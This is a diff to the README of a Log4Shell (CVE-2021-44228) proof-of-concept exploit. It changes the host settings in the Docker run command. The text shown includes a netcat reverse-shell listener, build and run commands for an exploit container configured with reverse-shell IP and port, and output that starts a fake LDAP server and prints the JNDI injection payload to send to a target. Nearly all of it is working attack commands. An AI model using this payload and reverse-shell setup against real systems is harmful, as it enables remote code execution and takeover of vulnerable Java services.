@@ -41,7 +41,7 @@ nc -lvnp 9001
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory of 'Dockerfile_poc'.
 ```py
 $ docker build -t log4j-poc -f Dockerfile_poc .
-$ docker run --rm -it -e WEB_IP="localhost" -e RSHELL_IP="localhost" -e RSHELL_PORT="9001" -p 127.0.0.1:8000:8000 -p 127.0.0.1:1389:1389 --name exploit log4j-poc
+$ docker run --rm -it -e WEB_IP="host.docker.internal" -e RSHELL_IP="host.docker.internal" -e RSHELL_PORT="9001" -p 127.0.0.1:8000:8000 -p 127.0.0.1:1389:1389 --name exploit log4j-poc
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
@@ -49,7 +49,7 @@ $ docker run --rm -it -e WEB_IP="localhost" -e RSHELL_IP="localhost" -e RSHELL_P
 [+] Exploit java class created success
 [+] Setting up fake LDAP server
 
-[+] Send me: ${jndi:ldap://localhost:1389/a}
+[+] Send me: ${jndi:ldap://host.docker.internal:1389/a}
 
 Listening on 0.0.0.0:1389
 ```
